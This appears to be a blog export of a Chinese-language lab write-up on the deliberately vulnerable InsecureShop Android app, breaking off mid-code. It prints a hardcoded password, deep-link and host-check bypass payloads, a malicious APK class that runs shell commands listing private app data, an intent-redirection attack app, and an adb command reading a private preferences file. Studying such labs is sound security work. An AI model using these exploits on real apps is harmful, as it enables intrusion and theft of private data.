<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>安卓APP漏洞学习（上）</title>
      <link href="/2025/01/22/%E5%AE%89%E5%8D%93APP%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0%EF%BC%88%E4%B8%8A%EF%BC%89%20/"/>
      <url>/2025/01/22/%E5%AE%89%E5%8D%93APP%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0%EF%BC%88%E4%B8%8A%EF%BC%89%20/</url>
      
        <content type="html"><![CDATA[<h2 id="硬编码凭证"><a href="#硬编码凭证" class="headerlink" title="硬编码凭证"></a>硬编码凭证</h2><p>某处硬编码了可用于登录应用程序的凭证。</p><p>通过配置文件发现登录相关活动组件</p><p><img src="/../imgs/183e7c086b3081bf800fe3e88ab4f232/image.png" alt="image.png"></p><p>在<code>com.insecureshop.LoginActivity</code> 中找到登录逻辑</p><p><img src="/../imgs/183e7c086b3081bf800fe3e88ab4f232/Pulrgximageimage_1uuwQOow_B.png" alt="183e7c086b3081bf800fe3e88ab4f232&#x2F;Pulrgximageimage_1uuwQOow_B.png"></p><p>关键代码</p><figure class="highlight jsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">boolean</span><br><span class="line">auth = <span class="title class_">Util</span>.<span class="property">INSTANCE</span>.<span class="title function_">verifyUserNamePassword</span>(username, password);</span><br></pre></td></tr></table></figure><p>在跟代码</p><figure class="highlight jsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">private</span><br><span class="line">final</span><br><span class="line"><span class="title class_">HashMap</span> &lt; <span class="title class_">String</span>, <span class="title class_">String</span> &gt; <span class="title function_">getUserCreds</span>(<span class="params"></span>)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="title class_">HashMap</span></span><br><span class="line">    userCreds = <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line">    userCreds.<span class="title function_">put</span>(<span class="string">&quot;shopuser&quot;</span>, <span class="string">&quot;!ns3csh0p&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> userCreds;</span><br><span class="line">&#125;</span><br><span class="line">public</span><br><span class="line">final</span><br><span class="line">boolean</span><br><span class="line"><span class="title function_">verifyUserNamePassword</span>(<span class="params"><span class="built_in">String</span></span></span><br><span class="line"><span class="params">username, <span class="built_in">String</span></span></span><br><span class="line"><span class="params">password</span></span><br><span class="line"><span class="params"></span>)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="title class_">Intrinsics</span>.<span class="title function_">checkParameterIsNotNull</span>(username, <span class="string">&quot;username&quot;</span>);</span><br><span class="line">    <span class="title class_">Intrinsics</span>.<span class="title function_">checkParameterIsNotNull</span>(password, <span class="string">&quot;password&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span> (!<span class="title function_">getUserCreds</span>().<span class="title function_">containsKey</span>(username)) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="title class_">String</span></span><br><span class="line">    passwordValue = <span class="title function_">getUserCreds</span>().<span class="title function_">get</span>(username);</span><br><span class="line">    <span class="keyword">return</span> <span class="title class_">StringsKt</span>.<span class="title function_">equals$default</span>(passwordValue, password, <span class="literal">false</span>, <span class="number">2</span>, <span class="literal">null</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="URL验证不足"><a href="#URL验证不足" class="headerlink" title="URL验证不足"></a><strong>URL验证不足</strong></h2><p>通过深度链接可以在webview中加载任意URL。</p><p>deeplink是特定的URI，</p><ul><li>可以将用户直接带到应用程序中的特定位置，而不是打开外部网站。</li><li>这有助于用户在网页和移动应用之间导航。</li></ul><p>格式</p><p><img src="/../imgs/183e7c086b3081bf800fe3e88ab4f232/Pulrgximageimage_2__z-9Ei8i.png" alt="183e7c086b3081bf800fe3e88ab4f232&#x2F;Pulrgximageimage_2__z-9Ei8i.png"></p><p><img src="/../imgs/183e7c086b3081bf800fe3e88ab4f232/Pulrgximageimage_QajjCd7HzX.png" alt="183e7c086b3081bf800fe3e88ab4f232&#x2F;Pulrgximageimage_QajjCd7HzX.png"></p><p>通过配置文件获取到<code>insecureshop</code></p><p><img src="/../imgs/183e7c086b3081bf800fe3e88ab4f232/Pulrgximageimage_2MG7nQbAyb.png" alt="183e7c086b3081bf800fe3e88ab4f232&#x2F;Pulrgximageimage_2MG7nQbAyb.png"></p><p><img src="/../imgs/183e7c086b3081bf800fe3e88ab4f232/Pulrgximageimage_IvD1QHaN1B.png" alt="183e7c086b3081bf800fe3e88ab4f232&#x2F;Pulrgximageimage_IvD1QHaN1B.png"></p><p>有一个检查来验证URI路径是否等于&#x2F;web，之后从一个intent中提取参数url到一个名为data的参数，该参数随后会在webview中加载。这非常有趣，因为我们可以构造这样的URI并传递任意参数作为url。我们将通过使用adb来实现这一点。<br>具体来说，我们将通过adb调用活动管理器，并指定一个动作和一个intent URI。以下命令可以实现这一点。</p><p><img src="/../imgs/183e7c086b3081bf800fe3e88ab4f232/Pulrgximageimage_Cr8rmA-9qc.png" alt="183e7c086b3081bf800fe3e88ab4f232&#x2F;Pulrgximageimage_Cr8rmA-9qc.png"></p><p>当然我们也可以去构造html让用户去点击</p><figure class="highlight jsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&lt;html&gt;</span><br><span class="line"><span class="language-xml"><span class="tag">&lt;<span class="name">head</span>&gt;</span><span class="tag">&lt;<span class="name">title</span>&gt;</span>Deeplink<span class="tag">&lt;/<span class="name">title</span>&gt;</span><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;<span class="name">body</span> <span class="attr">style</span>=<span class="string">&quot;text-align:center;&quot;</span>&gt;</span></span></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;<span class="name">hl</span>&gt;</span><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;insecureshop://com.insecureshop/web/?url=https://www.google.com&quot;</span>&gt;</span>Click here<span class="tag">&lt;/<span class="name">a</span>&gt;</span><span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span></span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure><p>深度链接滥用的影响</p><p><img src="/../imgs/183e7c086b3081bf800fe3e88ab4f232/Pulrgximageimage_aSBaXuztPO.png" alt="183e7c086b3081bf800fe3e88ab4f232&#x2F;Pulrgximageimage_aSBaXuztPO.png"></p><p><img src="/../imgs/183e7c086b3081bf800fe3e88ab4f232/Pulrgximageimage_NYNxLhoKtM.png" alt="183e7c086b3081bf800fe3e88ab4f232&#x2F;Pulrgximageimage_NYNxLhoKtM.png"></p><h2 id="主机验证弱检查"><a href="#主机验证弱检查" class="headerlink" title="主机验证弱检查"></a><strong>主机验证弱检查</strong></h2><p>可以绕过主机验证检查，在webview中加载任意URL。</p><p><img src="/../imgs/183e7c086b3081bf800fe3e88ab4f232/Pulrgximageimage_pnHcxnmhqn.png" alt="183e7c086b3081bf800fe3e88ab4f232&#x2F;Pulrgximageimage_pnHcxnmhqn.png"></p><figure class="highlight jsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (uri != <span class="literal">null</span>) &#123;</span><br><span class="line">    <span class="title class_">String</span></span><br><span class="line">    data = (<span class="title class_">String</span>)</span><br><span class="line">    <span class="literal">null</span>;</span><br><span class="line">    <span class="keyword">if</span> (!<span class="title class_">StringsKt</span>.<span class="title function_">equals$default</span>(uri.<span class="title function_">getPath</span>(), <span class="string">&quot;/web&quot;</span>, <span class="literal">false</span>, <span class="number">2</span>, <span class="literal">null</span>)) &#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="title class_">StringsKt</span>.<span class="title function_">equals$default</span>(uri.<span class="title function_">getPath</span>(), <span class="string">&quot;/webview&quot;</span>, <span class="literal">false</span>, <span class="number">2</span>, <span class="literal">null</span>)) &#123;</span><br><span class="line">            <span class="title class_">Intent</span></span><br><span class="line">            intent2 = <span class="title function_">getIntent</span>();</span><br><span class="line">            <span class="title class_">Intrinsics</span>.<span class="title function_">checkExpressionValueIsNotNull</span>(intent2, <span class="string">&quot;intent&quot;</span>);</span><br><span class="line">            <span class="title class_">Uri</span></span><br><span class="line">            data2 = intent2.<span class="title function_">getData</span>();</span><br><span class="line">            <span class="keyword">if</span> (data2 == <span class="literal">null</span>) &#123;</span><br><span class="line">                <span class="title class_">Intrinsics</span>.<span class="title function_">throwNpe</span>();</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="title class_">String</span></span><br><span class="line">            queryParameter = data2.<span class="title function_">getQueryParameter</span>(<span class="string">&quot;url&quot;</span>);</span><br><span class="line">            <span class="keyword">if</span> (queryParameter == <span class="literal">null</span>) &#123;</span><br><span class="line">                <span class="title class_">Intrinsics</span>.<span class="title function_">throwNpe</span>();</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="title class_">Intrinsics</span>.<span class="title function_">checkExpressionValueIsNotNull</span>(queryParameter, <span class="string">&quot;intent.data!!.getQueryParameter(\&quot;url\&quot;)!!&quot;</span>);</span><br><span class="line">            <span class="keyword">if</span> (<span class="title class_">StringsKt</span>.<span class="title function_">endsWith$default</span>(queryParameter, <span class="string">&quot;insecureshopapp.com&quot;</span>, <span class="literal">false</span>, <span class="number">2</span>, (<span class="title class_">Object</span>) <span class="literal">null</span></span><br><span class="line">        ))</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="title class_">Intent</span></span><br><span class="line">                intent3 = <span class="title function_">getIntent</span>();</span><br><span class="line">                <span class="title class_">Intrinsics</span>.<span class="title function_">checkExpressionValueIsNotNull</span>(intent3, <span class="string">&quot;intent&quot;</span>);</span><br><span class="line">                <span class="title class_">Uri</span></span><br><span class="line">                data3 = intent3.<span class="title function_">getData</span>();</span><br><span class="line">                data = data3 != <span class="literal">null</span> ? data3.<span class="title function_">getQueryParameter</span>(<span class="string">&quot;url&quot;</span>) : <span class="literal">null</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="title class_">Intent</span></span><br><span class="line">        intent4 = <span class="title function_">getIntent</span>();</span><br><span class="line">        <span class="title class_">Intrinsics</span>.<span class="title function_">checkExpressionValueIsNotNull</span>(intent4, <span class="string">&quot;intent&quot;</span>);</span><br><span class="line">        <span class="title class_">Uri</span></span><br><span class="line">        data4 = intent4.<span class="title function_">getData</span>();</span><br><span class="line">        data = data4 != <span class="literal">null</span> ? data4.<span class="title function_">getQueryParameter</span>(<span class="string">&quot;url&quot;</span>) : <span class="literal">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (data == <span class="literal">null</span>) &#123;</span><br><span class="line">        <span class="title function_">finish</span>();</span><br><span class="line">    &#125;</span><br><span class="line">    webview.<span class="title function_">loadUrl</span>(data);</span><br><span class="line">    <span class="title class_">Prefs</span>.<span class="property">INSTANCE</span>.<span class="title function_">getInstance</span>(<span class="variable language_">this</span>).<span class="title function_">setData</span>(data);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>看一下这段代码的逻辑</p><ol><li>获取uri对象用的path对象</li><li>判断path中是否包含<code>/webview</code></li><li>解析path，判断<code>?url=</code>参数是否为空</li><li>判断url参数是否以<code>insecureshopapp.com</code> 结尾</li><li>把url参数存放到data</li><li>最后使用webview.loadUrl(data);</li></ol><p>可以通过#进行绕过，payload如下</p><figure class="highlight jsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">adb</span><br><span class="line">shell</span><br><span class="line">am</span><br><span class="line">start - a</span><br><span class="line">android.<span class="property">intent</span>.<span class="property">action</span>.<span class="property">VIEW</span> - d</span><br><span class="line"><span class="attr">insecureshop</span>:<span class="comment">//com.insecureshop/webview?url=https://www.baidu.com%23insecureshopapp.com</span></span><br></pre></td></tr></table></figure><p><img src="/../imgs/183e7c086b3081bf800fe3e88ab4f232/Pulrgximageimage_Grgi5ZxN0i.png" alt="183e7c086b3081bf800fe3e88ab4f232&#x2F;Pulrgximageimage_Grgi5ZxN0i.png"></p><h2 id="任意代码执行"><a href="#任意代码执行" class="headerlink" title="任意代码执行"></a><strong>任意代码执行</strong></h2><p>通过第三方包上下文执行任意代码。</p><p>在LoginActivity发现以下代码</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> (PackageInfo info : getPackageManager().getInstalledPackages(<span class="number">0</span>)) &#123;            <span class="type">String</span> <span class="variable">packageName</span> <span class="operator">=</span> info.packageName;            Intrinsics.checkExpressionValueIsNotNull(packageName, <span class="string">&quot;packageName&quot;</span>);            <span class="keyword">if</span> (StringsKt.startsWith$<span class="keyword">default</span>(packageName, <span class="string">&quot;com.insecureshopapp&quot;</span>, <span class="literal">false</span>, <span class="number">2</span>, (Object) <span class="literal">null</span>)) &#123;                <span class="keyword">try</span> &#123;                    <span class="type">Context</span> <span class="variable">packageContext</span> <span class="operator">=</span> createPackageContext(packageName, <span class="number">3</span>);                    Intrinsics.checkExpressionValueIsNotNull(packageContext, <span class="string">&quot;packageContext&quot;</span>);                    <span class="type">Object</span> <span class="variable">value</span> <span class="operator">=</span> packageContext.getClassLoader().loadClass(<span class="string">&quot;com.insecureshopapp.MainInterface&quot;</span>).getMethod(<span class="string">&quot;getInstance&quot;</span>, Context.class).invoke(<span class="literal">null</span>, <span class="built_in">this</span>);                    Intrinsics.checkExpressionValueIsNotNull(value, <span class="string">&quot;packageContext.classLoad…      .invoke(null, this)&quot;</span>);                    Log.d(<span class="string">&quot;object_value&quot;</span>, value.toString());                &#125; <span class="keyword">catch</span> (Exception e) &#123;                    <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">RuntimeException</span>(e);                &#125;            &#125;        &#125;</span><br></pre></td></tr></table></figure><p>代码分析：</p><ol><li>首先回去遍历已经安装的应用包，获取每个应用的packageName</li><li>检查包名中是否以<code>com.insecureshopapp</code> 开头</li><li>动态加载包中的类，使用 createPackageContext 创建目标包的上下文（Context）。参数 3 表示 Context.CONTEXT_INCLUDE_CODE |<br>Context.CONTEXT_IGNORE_SECURITY，即允许加载代码并忽略安全限制。</li><li>使用 ClassLoader 动态加载目标包中的 com.insecureshopapp.MainInterface 类。</li></ol><p>那么我们可以创建一个恶意apk <code>com.insecureshopapp</code> 类MainInterface编写getInstance方法</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.insecureshopapp;<span class="keyword">import</span> android.content.Context;<span class="keyword">import</span> android.util.Log;<span class="keyword">import</span> android.widget.Toast;<span class="keyword">import</span> java.io.BufferedReader;<span class="keyword">import</span> java.io.InputStreamReader;<span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">MainInterface</span> &#123;<span class="keyword">public</span> <span class="keyword">static</span> Object <span class="title function_">getInstance</span><span class="params">(Context context)</span> &#123;    <span class="comment">// Malicious code to be executed    StringBuilder output = new StringBuilder();    try &#123;</span></span><br><span class="line">        <span class="type">ProcessBuilder</span> <span class="variable">processBuilder</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ProcessBuilder</span>(<span class="string">&quot;sh&quot;</span>, <span class="string">&quot;-c&quot;</span>, <span class="string">&quot;whoami;ls /data/data/com.insecureshop/&quot;</span>);        <span class="type">Process</span> <span class="variable">process</span> <span class="operator">=</span> processBuilder.start();        <span class="type">BufferedReader</span> <span class="variable">reader</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">BufferedReader</span>(<span class="keyword">new</span> <span class="title class_">InputStreamReader</span>(process.getInputStream()));        String line;        <span class="keyword">while</span> ((line = reader.readLine()) != <span class="literal">null</span>) &#123;            output.append(line).append(<span class="string">&quot;\n&quot;</span>);        &#125;        process.waitFor();        Log.d(<span class="string">&quot;MainInterface&quot;</span>, <span class="string">&quot;Command Output: &quot;</span> + output.toString());    &#125;    <span class="keyword">catch</span> (Exception e) &#123;        <span class="keyword">return</span> <span class="literal">null</span>;    &#125;    <span class="keyword">return</span> <span class="literal">null</span>;&#125;&#125;</span><br></pre></td></tr></table></figure><p>根据操作系统版本进行更换</p><p><img src="/../imgs/183e7c086b3081bf800fe3e88ab4f232/Pulrgximageimage_2pvnImPG9-.png" alt="183e7c086b3081bf800fe3e88ab4f232&#x2F;Pulrgximageimage_2pvnImPG9-.png"></p><p>编辑apk，安装</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">adb install debug/app-debug.apk</span><br></pre></td></tr></table></figure><p>查看日志</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">OnePlus5T:/ ## cd /data/data/com.insecureshopOnePlus5T:/data/data/com.insecureshop ## ls</span><br><span class="line">app_textures  app_webview  cache  code_cache  shared_prefs</span><br><span class="line">OnePlus5T:/data/data/com.insecureshop ## logcat | grep <span class="string">&quot;MainInterface&quot;</span><span class="number">01</span>-<span class="number">22</span> <span class="number">16</span>:<span class="number">16</span>:<span class="number">57.386</span>  <span class="number">6422</span>  <span class="number">6422</span> D MainInterface: Command Output: u0_a191</span><br><span class="line"><span class="number">01</span>-<span class="number">22</span> <span class="number">16</span>:<span class="number">16</span>:<span class="number">57.386</span>  <span class="number">6422</span>  <span class="number">6422</span> D MainInterface: app_textures</span><br><span class="line"><span class="number">01</span>-<span class="number">22</span> <span class="number">16</span>:<span class="number">16</span>:<span class="number">57.386</span>  <span class="number">6422</span>  <span class="number">6422</span> D MainInterface: app_webview</span><br><span class="line"><span class="number">01</span>-<span class="number">22</span> <span class="number">16</span>:<span class="number">16</span>:<span class="number">57.386</span>  <span class="number">6422</span>  <span class="number">6422</span> D MainInterface: cache</span><br><span class="line"><span class="number">01</span>-<span class="number">22</span> <span class="number">16</span>:<span class="number">16</span>:<span class="number">57.386</span>  <span class="number">6422</span>  <span class="number">6422</span> D MainInterface: code_cache</span><br><span class="line"><span class="number">01</span>-<span class="number">22</span> <span class="number">16</span>:<span class="number">16</span>:<span class="number">57.386</span>  <span class="number">6422</span>  <span class="number">6422</span> D MainInterface: shared_prefs</span><br></pre></td></tr></table></figure><p><img src="/../imgs/183e7c086b3081bf800fe3e88ab4f232/Pulrgximage0122_zwr_-2rCSw.gif" alt="183e7c086b3081bf800fe3e88ab4f232&#x2F;Pulrgximage0122_zwr_-2rCSw.gif"></p><h2 id="访问受保护的组件"><a href="#访问受保护的组件" class="headerlink" title="访问受保护的组件"></a><strong>访问受保护的组件</strong></h2><p>应用程序接收嵌入的Intent并将其传递给如startActivity方法。这允许任何第三方应用程序启动任何受保护的组件。</p><p>正如挑战描述所建议的，应该有一个意图传递给<code>startActivity</code>函数。我搜索了代码，在<code>com.insecureshop.WebView2Activity</code><br>中发现了以下这段引起了我的注意：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">onCreate</span><span class="params">(Bundle savedInstanceState)</span> &#123;        <span class="built_in">super</span>.onCreate(savedInstanceState);        setContentView(R.layout.activity_webview);        setSupportActionBar((Toolbar) _$_findCachedViewById(R.id.toolbar));        setTitle(getString(R.string.webview));        <span class="type">Intent</span> <span class="variable">extraIntent</span> <span class="operator">=</span> (Intent) getIntent().getParcelableExtra(<span class="string">&quot;extra_intent&quot;</span>);        <span class="keyword">if</span> (extraIntent != <span class="literal">null</span>) &#123;            startActivity(extraIntent);            finish();            <span class="keyword">return</span>;        &#125;</span><br></pre></td></tr></table></figure><p>这里的代码正在等待接收一个带有键 <code>extra_intent</code> 的 Intent，但危险的部分在于接收到的 Intent 被传递给了 <code>startActivity</code><br>函数，这将允许我们访问应用程序中的任何 Intent，即使它没有被导出。让我们在我们的应用中查找这样的 Activity：</p><figure class="highlight jsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;activity</span><br><span class="line">    <span class="attr">android</span>:name=<span class="string">&quot;com.insecureshop.PrivateActivity&quot;</span> <span class="attr">android</span>:exported=<span class="string">&quot;false&quot;</span>/&gt;</span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">onCreate</span><span class="params">(Bundle savedInstanceState)</span> &#123;    <span class="type">String</span> <span class="variable">data</span> <span class="operator">=</span> getIntent().getStringExtra(<span class="string">&quot;url&quot;</span>);    <span class="keyword">if</span> (data == <span class="literal">null</span>) &#123;        data = <span class="string">&quot;https://www.insecureshopapp.com&quot;</span>;</span><br><span class="line">    &#125;    webview.loadUrl(data);    Prefs.INSTANCE.getInstance(<span class="built_in">this</span>).setData(data);&#125;</span><br></pre></td></tr></table></figure><p><code>PrivateActivity</code> 是一个未导出的活动，不能直接访问，因此我们可以利用 <code>WebView2Activity</code> 中出现的漏洞来访问它。我们有两种方法可以利用这个漏洞：使用<br>ADB AM 命令或创建一个攻击应用程序。不幸的是，我尝试了很多次 am 命令，但没能找到正确的命令。所以让我们创建一个攻击应用程序。我将通过<br>Android Studio 创建一个带有空活动的应用程序，并添加以下代码：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.insecureshop2;<span class="keyword">import</span> android.content.Intent;<span class="keyword">import</span> android.os.Bundle;<span class="keyword">import</span> android.view.View;<span class="keyword">import</span> android.widget.Button;<span class="keyword">import</span> androidx.activity.EdgeToEdge;<span class="keyword">import</span> androidx.appcompat.app.AppCompatActivity;<span class="keyword">import</span> androidx.core.graphics.Insets;<span class="keyword">import</span> androidx.core.view.ViewCompat;<span class="keyword">import</span> androidx.core.view.WindowInsetsCompat;<span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">MainActivity</span> <span class="keyword">extends</span> <span class="title class_">AppCompatActivity</span> &#123;    <span class="meta">@Override</span>    <span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">onCreate</span><span class="params">(Bundle savedInstanceState)</span> &#123;        <span class="built_in">super</span>.onCreate(savedInstanceState);        setContentView(R.layout.activity_main);        <span class="type">Button</span> <span class="variable">IntentButton</span> <span class="operator">=</span> (Button) findViewById(R.id.button);        <span class="comment">// Set a click listener to send the intent        IntentButton.setOnClickListener(new View.OnClickListener() &#123;            @Override            public void onClick(View v) &#123;                // Making an Intent to the PrivateActivity with the extra &quot;url&quot;                Intent privateActivityIntent = new Intent();                privateActivityIntent.setClassName(&quot;com.insecureshop&quot;, &quot;com.insecureshop.PrivateActivity&quot;);                privateActivityIntent.putExtra(&quot;url&quot;, &quot;https://www.baidu.com&quot;);                // Passing the whole intent to the extra_intent So we trigger the startActivity in the WebView2Activity class                Intent webViewIntent = new Intent();                webViewIntent.setClassName(&quot;com.insecureshop&quot;, &quot;com.insecureshop.WebView2Activity&quot;);                webViewIntent.putExtra(&quot;extra_intent&quot;, privateActivityIntent);                startActivity(webViewIntent);            &#125;        &#125;);    &#125;&#125;</span></span><br></pre></td></tr></table></figure><p>添加button</p><p><img src="/../imgs/183e7c086b3081bf800fe3e88ab4f232/Pulrgximageimage_KoJW88-lC1.png" alt="183e7c086b3081bf800fe3e88ab4f232&#x2F;Pulrgximageimage_KoJW88-lC1.png"></p><p>利用演示</p><p><img src="/../imgs/183e7c086b3081bf800fe3e88ab4f232/Pulrgximage0121_EEEKdY5NTA.gif" alt="183e7c086b3081bf800fe3e88ab4f232&#x2F;Pulrgximage0121_EEEKdY5NTA.gif"></p><h2 id="未受保护的数据URI"><a href="#未受保护的数据URI" class="headerlink" title="未受保护的数据URI"></a><strong>未受保护的数据URI</strong></h2><p>通过loadUrl方法传递的不受信任的URI允许攻击者在webview中传递任意URL。</p><p>这个挑战与其他挑战类似，我们在 <code>com.insecureshop.WebView2Activity</code> 中有一个被导出的隐式 Intent。但这次它接受我们传入的任何值，并尝试用<br>WebView 加载，这意味着我们也可以访问内部文件。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">Intent</span> <span class="variable">intent</span> <span class="operator">=</span> getIntent();        Intrinsics.checkExpressionValueIsNotNull(intent, <span class="string">&quot;intent&quot;</span>);        <span class="type">String</span> <span class="variable">dataString</span> <span class="operator">=</span> intent.getDataString();        <span class="keyword">if</span> (!(dataString == <span class="literal">null</span> || StringsKt.isBlank(dataString))) &#123;            <span class="type">Intent</span> <span class="variable">intent2</span> <span class="operator">=</span> getIntent();            Intrinsics.checkExpressionValueIsNotNull(intent2, <span class="string">&quot;intent&quot;</span>);            webview.loadUrl(intent2.getDataString());            <span class="keyword">return</span>;        &#125;</span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">adb shell  am start -n com.insecureshop/.WebView2Activity -d file:<span class="comment">///data/data/com.insecureshop/shared_prefs/Prefs.xml</span></span><br></pre></td></tr></table></figure><p><img src="/../imgs/183e7c086b3081bf800fe3e88ab4f232/Pulrgximageimage_en3-Hbq6NK.png" alt="183e7c086b3081bf800fe3e88ab4f232&#x2F;Pulrgximageimage_en3-Hbq6NK.png"></p><h2 id="任意文件窃取"><a href="#任意文件窃取" class="headerlink" title="任意文件窃取"></a><strong>任意文件窃取</strong></h2><p>通过ChooserActivity可以窃取应用程序本地存储中的文件。</p><p>找到相应代码</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">final</span> <span class="keyword">class</span> <span class="title class_">ChooserActivity</span> <span class="keyword">extends</span> <span class="title class_">AppCompatActivity</span> &#123;    <span class="keyword">private</span> HashMap _$_findViewCache;    <span class="keyword">public</span> <span class="keyword">void</span> _$_clearFindViewByIdCache() &#123;        <span class="type">HashMap</span> <span class="variable">hashMap</span> <span class="operator">=</span> <span class="built_in">this</span>._$_findViewCache;        <span class="keyword">if</span> (hashMap != <span class="literal">null</span>) &#123;            hashMap.clear();        &#125;    &#125;    <span class="keyword">public</span> View _$_findCachedViewById(<span class="type">int</span> i) &#123;        <span class="keyword">if</span> (<span class="built_in">this</span>._$_findViewCache == <span class="literal">null</span>) &#123;            <span class="built_in">this</span>._$_findViewCache = <span class="keyword">new</span> <span class="title class_">HashMap</span>();        &#125;        <span class="type">View</span> <span class="variable">view</span> <span class="operator">=</span> (View) <span class="built_in">this</span>._$_findViewCache.get(Integer.valueOf(i));        <span class="keyword">if</span> (view != <span class="literal">null</span>) &#123;            <span class="keyword">return</span> view;        &#125;        <span class="type">View</span> <span class="variable">findViewById</span> <span class="operator">=</span> findViewById(i);        <span class="built_in">this</span>._$_findViewCache.put(Integer.valueOf(i), findViewById);        <span class="keyword">return</span> findViewById;    &#125;    <span class="meta">@Override</span> <span class="comment">// androidx.appcompat.app.AppCompatActivity, androidx.fragment.app.FragmentActivity, androidx.activity.ComponentActivity, androidx.core.app.ComponentActivity, android.app.Activity    protected void onCreate(Bundle savedInstanceState) &#123;        super.onCreate(savedInstanceState);        setContentView(C0781R.layout.activity_chooser);        Intent intent = getIntent();        Intrinsics.checkExpressionValueIsNotNull(intent, &quot;intent&quot;);        if (intent.getExtras() 